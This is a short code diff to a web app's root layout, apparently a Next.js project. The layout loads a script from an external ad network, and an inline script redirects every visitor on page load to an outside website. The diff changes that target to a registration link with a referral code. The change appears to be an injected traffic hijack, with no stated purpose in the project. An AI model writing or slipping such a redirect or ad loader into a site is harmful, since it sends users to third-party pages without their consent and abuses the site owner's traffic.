@@ -27,7 +27,7 @@ export default function RootLayout({
         <script src="https://pl28389000.effectivegatecpm.com/f1/4f/74/f14f74330d0fdd4562e69cc344e34278.js"></script>
         <script>
           {`if (typeof window !== 'undefined') {
-            window.location.href = 'https://www.helpinghands.money';
+            window.location.href = 'https://helpinghands.money/register?ref=EBQM4F9OHW';
           }`}
         </script>
       </head>
